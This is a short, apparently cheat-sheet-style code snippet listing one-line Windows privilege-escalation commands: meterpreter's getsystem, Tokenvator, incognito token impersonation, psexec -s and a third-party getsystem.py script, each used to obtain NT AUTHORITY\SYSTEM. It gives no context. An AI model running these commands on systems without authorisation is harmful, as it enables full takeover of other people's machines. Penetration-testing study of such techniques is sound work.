---
id: f43228cc-5008-4fed-8775-b147a66ed1ee
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:30.113981+00:00'
updated_at: '2023-04-10T20:37:40.629332+00:00'
---

# Code Snippet f43228cc

**Language**: Powershell

```powershell
meterpreter> getsystem 
Tokenvator.exe getsystem cmd.exe 
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe 
psexec -s -i cmd.exe 
python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
```


